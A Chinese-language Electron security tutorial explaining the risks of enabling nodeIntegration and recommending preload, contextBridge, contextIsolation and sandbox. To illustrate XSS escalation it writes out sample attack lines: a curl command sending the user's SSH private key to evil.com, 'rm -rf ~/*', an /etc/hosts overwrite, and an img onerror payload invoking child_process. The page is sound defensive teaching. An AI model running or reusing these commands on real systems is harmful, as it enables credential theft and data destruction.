---
title: 为什么建议关闭 NodeIntegration？
category: Electron
difficulty: 中级
updatedAt: 2025-12-11
summary: >-
  深入理解 nodeIntegration 的安全风险，以及为什么 Electron 默认禁用它来保护应用安全。
tags:
  - Electron
  - 安全
  - nodeIntegration
  - 最佳实践
estimatedTime: 10 分钟
keywords:
  - nodeIntegration
  - 安全风险
  - XSS攻击
highlight: 关闭 nodeIntegration 是防止渲染进程被恶意代码利用的关键安全措施
order: 11
---

## 问题 1：nodeIntegration 是什么？

`nodeIntegration` 是 BrowserWindow 的一个配置选项，控制渲染进程是否可以直接使用 Node.js API：

```javascript
new BrowserWindow({
  webPreferences: {
    nodeIntegration: true, // 启用后可以在渲染进程使用 require()
  },
});
```

启用后，渲染进程中的 JavaScript 可以：

```javascript
// 渲染进程中
const fs = require("fs");
const { exec } = require("child_process");
const os = require("os");
```

---

## 问题 2：为什么要关闭它？

### 核心风险：XSS 攻击升级

普通 Web 应用的 XSS 攻击范围有限，但在开启 nodeIntegration 的 Electron 应用中，XSS 可以造成灾难性后果：

```javascript
// 普通 Web 应用的 XSS
// 攻击者能做的：
// - 窃取 cookie
// - 修改页面内容
// - 发送恶意请求

// Electron + nodeIntegration 的 XSS
// 攻击者能做的：
const { exec } = require("child_process");
exec("curl http://evil.com/steal?data=$(cat ~/.ssh/id_rsa)"); // 窃取 SSH 密钥
exec("rm -rf ~/*"); // 删除用户文件

const fs = require("fs");
fs.writeFileSync("/etc/hosts", "malicious content"); // 修改系统文件
```

### 攻击场景

#### 场景 1：加载远程内容

```javascript
// 如果你的应用加载远程 URL
win.loadURL("https://example.com");

// 而这个网站被入侵或有 XSS 漏洞
// 攻击者注入的脚本就能访问用户的整个系统
```

#### 场景 2：显示用户内容

```javascript
// 如果你的应用显示用户生成的内容
document.innerHTML = userContent;

// 用户提交的恶意内容
const maliciousContent = `
  <img src="x" onerror="
    require('child_process').exec('malicious command');
  ">
`;
```

#### 场景 3：第三方依赖

```javascript
// 你使用的某个 npm 包被植入恶意代码
// 在 nodeIntegration 开启的情况下
// 这个恶意代码可以访问系统
```

---

## 问题 3：关闭后如何安全地使用 Node 功能？

使用 preload + contextBridge 模式：

```javascript
// main.js
new BrowserWindow({
  webPreferences: {
    nodeIntegration: false, // 关闭
    contextIsolation: true, // 开启
    preload: path.join(__dirname, "preload.js"),
  },
});

// preload.js - 只暴露必要的、安全的 API
const { contextBridge, ipcRenderer } = require("electron");

contextBridge.exposeInMainWorld("safeAPI", {
  // ✅ 暴露具体的、受限的功能
  readUserConfig: () => ipcRenderer.invoke("read-user-config"),
  saveUserConfig: (config) => ipcRenderer.invoke("save-user-config", config),

  // ❌ 不要暴露通用的文件操作
  // readFile: (path) => fs.readFileSync(path)  // 危险！
});

// main.js - 在主进程中验证和处理
ipcMain.handle("read-user-config", async () => {
  // 只读取特定的配置文件
  const configPath = path.join(app.getPath("userData"), "config.json");
  return fs.promises.readFile(configPath, "utf-8");
});
```

---

## 问题 4：什么情况下可以开启 nodeIntegration？

几乎没有正当理由开启它。但如果你确实需要：

### 严格的前提条件

```javascript
// 只有同时满足以下所有条件才考虑开启：
// 1. 只加载本地文件，永远不加载远程 URL
// 2. 不显示任何用户生成的内容
// 3. 不使用任何第三方前端库
// 4. 应用不联网

new BrowserWindow({
  webPreferences: {
    nodeIntegration: true,
    // 即使开启，也要配合其他安全措施
    webSecurity: true,
    allowRunningInsecureContent: false,
  },
});
```

### 更好的替代方案

即使满足上述条件，使用 preload 模式仍然是更好的选择：

```javascript
// 好处：
// 1. 明确的 API 边界
// 2. 更容易审计安全性
// 3. 未来迁移更方便
// 4. 符合最小权限原则
```

---

## 问题 5：Electron 的安全演进

### 历史版本

```javascript
// Electron < 5.0
// 默认：nodeIntegration: true, contextIsolation: false
// 非常不安全

// Electron 5.0+
// 默认：nodeIntegration: false
// 改进了安全性

// Electron 12.0+
// 默认：contextIsolation: true
// 进一步加强安全性
```

### 现代最佳实践

```javascript
// 推荐配置
new BrowserWindow({
  webPreferences: {
    nodeIntegration: false,
    contextIsolation: true,
    sandbox: true, // 额外的沙箱保护
    webSecurity: true,
    preload: path.join(__dirname, "preload.js"),
  },
});
```

## 延伸阅读

- [Electron 安全清单](https://www.electronjs.org/docs/latest/tutorial/security)
- [Context Isolation 详解](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [OWASP Electron 安全指南](https://cheatsheetseries.owasp.org/cheatsheets/Electron_Security_Cheat_Sheet.html)
